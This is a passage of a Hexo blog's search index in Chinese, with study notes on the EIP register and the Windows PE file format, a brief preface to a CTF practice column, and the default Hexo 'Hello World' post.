Pointer（指令指针寄存器）</p><p>EIP中保存着CPU要执行的指令的地址，其大小为4个字节，由IP拓展而来。程序运行时，CPU会读取EIP中的一条指令的地址，传送指令到缓冲区过后，EIP的值自动增加，增加的大小即为所读取指令的字节大小，以保证指令被依次执行。需要注意的是：EIP的值并不能被直接修改，只能通过一些指令如:JMP,CALL,RET等间接进行修改。</p><h2 id="第二部分：PE文件格式"><a href="#第二部分：PE文件格式" class="headerlink" title="第二部分：PE文件格式"></a>第二部分：PE文件格式</h2><h3 id="第十三章：PE文件格式"><a href="#第十三章：PE文件格式" class="headerlink" title="第十三章：PE文件格式"></a>第十三章：PE文件格式</h3><p>13.1介绍：</p><p>PE文件是Windows操作系统下使用的可执行文件格式，是微软在UNIX平台的COFF基础上制作的，最初设计用来提高程序在不同操作系统上的移植性，但实际上这种文件格式仅用于Windows操作系统下。</p><p>13.2PE文件格式：</p><p>使用Hex Editor打开记事本程序，运行所需要的所有信息都储存在PE头中。大量信息以结构体的形式存储在PE头中，换言之，学习文件格式就是学习PE文件头中的结构体。</p><p>13.2.1：基本结构</p><p>从DOS头到节区头是PE头部分，其下的节区合称PE体。文件中使用偏移，内存中使用VA来表示位置。文件加载到内存时，情况就会发生变化（节区的大小，位置等）。文件的内容一般可分为代码(.text)、数据(.data)、资源(.rsrc)节分别保存。</p><p>​    各节区头定义了各节区在文件或内存中的大小，位置，属性等。</p><p>PE头与各节区尾部存在一个区域，成为NULL填充。计算机中存在“最小基本单位”这一概念，PE文件中也类似。文件/内存中节区的起始位置应该在各文件/内存最小单位的倍数位置上，空白区域会用NULL填充。</p><p>13.2.2 VA&amp;RVA</p><p>VA指的是进程虚拟内存的绝对地址，RVA指的是从某个基准位置(ImageBase)开始的相对地址。VA与RVA之间存在着以下的换算关系：</p><p>​                                                                    <strong>RVA+ImageBase=VA</strong></p><p>PE头内部信息大多以RVA存在。原因在于，PE文件加载到虚拟内存的指定位置时，该位置可能已经加载了其他PE文件，此时必须通过重定位将其加载到其他空白位置，倘若使用VA，则无法正常访问，因此使用RVA来定位信息，即使有重定位发生，只要相对ImageBase的相对地址没变化，就能正常访问到指定信息而不会出现问题。</p><p>13.3 PE头</p><p>13.3.1DOS头</p><p>微软在创建PE文件格式时，DOS文件正被广泛使用，所以微软充分考虑了PE文件对DOS文件的兼容性，最终体现为，在PE头最前面添加了一个IMAGE_DOS_HEADER结构体，来拓展已有的DOS EXE头</p><p><font color='red'>IMAGE_DOS_HEADER:</font></p><p>该结构体大小为64字节。在该结构体中有两个重要成员：</p><p>e_magic:DOS签名(4D5A=&gt;’MZ’标志可执行)</p><p>e_lfanew:指示NT头的偏移(根据不同文件拥有可变值)</p><p>13.3.2DOS存根</p><p>DOS存根(stub)在DOS偷的下方，且大小不固定(即使不存在，程序也可正常运行)。DOS存根由代码与数据混合而成，不重要，此处略过。</p><p>13.3.3NT头</p><p><font color='red'>IMAGE_NT_HEADERS:</font></p><p>该结构体由三个成员组成，第一个成员为签名结构体，另外两个成员分别为文件头与可选头。</p><p>13.3.4 NT头:文件头</p><p><font color='red'>IMAGE_FILE_HEADER:</font></p><p>该结构体中主要有如下四个重要成员(若设置不正确，将导致程序无法正常运行)：</p><p>#Machine</p><p>每个CPU季都有着唯一的Machine码。</p><p>#NumberOfSections</p><p>NumberOfSections用来指出文件中存在的节区数量。该值一定要大于零，且当定义的节区数量与实际的节区数量不同时，将发生运行错误。</p><p>#SizeOfOptionalHeader</p><p>IMAGE_NT_HEADER结构体的最后一个成员为IMAGE_OPTIONAL_HEADER32结构体。SizeOfOptionalHeader成员用来指出IMAGE_OPTIONAL_HEADER的SizeOfOptionalHeader值，从而识别出IMAGE_OPTIONAL_HEADER32结构体的大小。</p><p>#Characteristics</p><p>该字段用来标识文件的属性，文件是否是可运行的状态、是否为DLL文件等信息。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Everyday CTF</title>
    <link href="/2021/12/10/everyday%20CTF/"/>
    <url>/2021/12/10/everyday%20CTF/</url>
    
    <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>​    因本人技术水平有限，且极度缺乏CTF经验，处于急需长见识的阶段，故在做题过程中采取先对程序逻辑简要分析，随后立即查看WP的方法来达到短时间内积累题型的目的，故在此不对题目进行深入分析。此栏主要用于记载在刷题过程中遇到的一些有意思的题目。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2021/12/05/hello-world/"/>
    <url>/2021/12/05/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
